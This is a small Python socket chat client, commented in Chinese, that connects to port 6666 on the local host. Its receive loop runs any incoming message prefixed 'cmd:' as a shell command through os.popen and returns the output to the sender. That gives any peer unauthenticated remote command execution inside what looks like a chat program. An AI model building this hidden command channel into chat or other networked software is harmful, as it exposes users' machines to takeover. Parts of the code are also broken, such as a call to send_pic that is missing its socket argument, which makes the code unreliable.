#!/usr/bin/env python
# coding=GBK
import socket
import threading
import os
import select

# 连接服务器
import sys

import time


def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hostName = socket.gethostname()
    hostAddr = socket.gethostbyname_ex(hostName)
    port = 6666
    try:
        s.connect((hostAddr[2][0], port))
    except:
        print(hostAddr[2][0] + "连接失败！")
        exit()
    return s


# 加密字符串
def enc(my_str, key):
    str_ret = ""
    c = ""
    if type(my_str) is str:
        for i in my_str:
            c = chr(ord(i) ^ key)
            str_ret += c
        return str_ret
    else:
        for i in my_str:
            c = chr(ord(i) ^ key)
            str_ret += c
        return str_ret


# 执行cmd命令
def cmd(cmd_socket, cmd_data):
    n = cmd_data.decode("GBK").split(":")[1]
    ret = os.popen(n)
    ret_str = "shush:"+ret.read()

    cmd_socket.send(ret_str.encode("GBK"))
    ret.close()


# 发送图片
def send_pic(m_socket, pic_path):
    with open(pic_path, 'rb') as f:
        for pic_data in f:
            m_socket.send(pic_data)
    print("图片发送完成!")


# 接收数据
def receive(m_socket):
    while True:
        try:
            data_ret = m_socket.recv(4096)
            if not data_ret:
                pass
            elif "cmd:" in data_ret.decode("GBK")[:10]:  # 执行cmd命令
                cmd(m_socket, data_ret)
            else:
                print(data_ret.decode("GBK"))  # 打印聊天信息
        except Exception as e:
            print(e)
            break


# 发送数据
def send(m_socket):
    while True:
        time.sleep(0.3)
        try:
            texts = input("")  # 接收用户输入
            if texts is "":
                continue
            if texts == 'img:':  # 如果是图片则发送图片过去
                send_pic('./gif.gif')
            else:
                m_socket.send(texts.encode("GBK"))  # 发送用户输入的内容
        except Exception as e:
            print(e)
            break


if __name__ == '__main__':
    m_socket = conn()
    welcome = m_socket.recv(4096)
    print(welcome.decode("GBK"))

    t1 = threading.Thread(target=receive, args=[m_socket, ])
    t1.start()
    t2 = threading.Thread(target=send, args=[m_socket, ])
    t2.start()
